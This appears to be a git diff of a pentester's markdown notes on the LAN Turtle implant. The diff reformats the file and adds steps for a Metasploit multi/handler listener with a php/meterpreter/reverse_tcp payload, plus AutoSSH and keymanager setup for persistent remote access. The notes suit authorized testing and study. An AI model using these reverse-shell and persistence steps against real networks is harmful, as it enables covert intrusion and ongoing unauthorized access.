@@ -2,13 +2,13 @@
 
 Network config: 
 
-'/etc/config/network'
+    /etc/config/network
 
 
 
 Module locations:
 
-'/etc/turtle/modules'
+    /etc/turtle/modules
 
  to start a module from here: ./<module> start
  
@@ -20,22 +20,48 @@ Module locations:
 ### Meterpreter reverse shell
 
 Setting up listener
+ 
+    msfconsole
 
-'''
-msfconsole
+    use exploit/multi/handler
 
-use exploit/multi/handler
+    set PAYLOAD php/meterpreter/reverse_tcp
 
-set PAYLOAD php/meterpreter/reverse_tcp
+    set LPORT/LHOST
+    set ExitOnSession false
+    exploit -j
 
-set LPORT/LHOST
+ Set up LAN Turtle
 
-exploit -j
-'''
-
-Set up LAN Turtle
-
-'''
-
-
-'''
+ Configure meterpreter-http with the correct IP and Port.
+ 
+### AutoSSH
+  
+  Modules: autossh and keymanager
+  
+  Require VM with SSH server. 
+  
+    
+  On the server create user to run the connection
+  
+       adduser turtle
+       
+       systemctl start ssh.service
+  
+   Use keymanager to generate keys and send the key to the server. (will be under /root/.ssh)
+   
+    Host: IP of SSH server
+    Port: Listening port of SSH server
+    User: user that was just created on server
+    
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+ 
